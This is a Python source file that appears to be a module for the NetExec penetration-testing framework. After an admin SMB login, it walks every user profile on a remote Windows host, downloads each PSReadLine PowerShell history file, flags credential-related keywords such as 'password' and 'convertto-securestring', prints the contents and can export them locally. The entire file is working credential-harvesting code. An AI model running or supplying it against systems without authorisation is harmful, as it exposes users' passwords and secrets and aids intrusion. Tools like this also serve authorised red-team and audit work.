from os import makedirs
from os.path import join, abspath
from nxc.paths import NXC_PATH
from io import BytesIO


class NXCModule:
    # Module by @357384n
    # Modified by @Defte_ 12/10/2024 to remove unecessary powershell execute command

    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
    sensitive_keywords = [
        "password", "passw", "secret", "credential", "key",
        "get-credential", "convertto-securestring", "set-localuser",
        "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
        "invoke-webrequest", "invoke-restmethod"
    ]

    def options(self, _, module_options):
        self.export = bool(module_options.get("EXPORT", False))

    def on_admin_login(self, context, connection):
        for directory in connection.conn.listPath("C$", "Users\\*"):
            if directory.get_longname() not in self.false_positive and directory.is_directory():
                try:
                    powershell_history_dir = f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"
                    for file in connection.conn.listPath("C$", f"{powershell_history_dir}\\*"):
                        if file.get_longname() not in self.false_positive:
                            file_path = f"{powershell_history_dir}{file.get_longname()}"
                            
                            buf = BytesIO()
                            connection.conn.getFile("C$", file_path, buf.write)
                            buf.seek(0)
                            file_content = buf.read().decode("utf-8", errors="ignore").lower()                
                            keywords = [keyword.upper() for keyword in self.sensitive_keywords if keyword in file_content]
                            if len(keywords):
                                context.log.highlight(f"C:\\{file_path} [ {' '.join(keywords)} ]")
                            else:
                                context.log.highlight(f"C:\\{file_path}")

                            for line in file_content.splitlines():
                                context.log.highlight(f"\t{line}")    
                            if self.export:
                                filename = f"{connection.host}_{directory.get_longname()}_powershell_history.txt"
                                export_path = join(NXC_PATH, "modules", "powershell_history")
                                path = abspath(join(export_path, filename))
                                makedirs(export_path, exist_ok=True)
                                try:
                                    with open(path, "w+") as file:
                                        file.write(file_content)
                                    context.log.highlight(f"PowerShell history written to: {path}")
                                except Exception as e:
                                    context.log.fail(f"Failed to write history to {filename}: {e}")
                except Exception:
                    pass
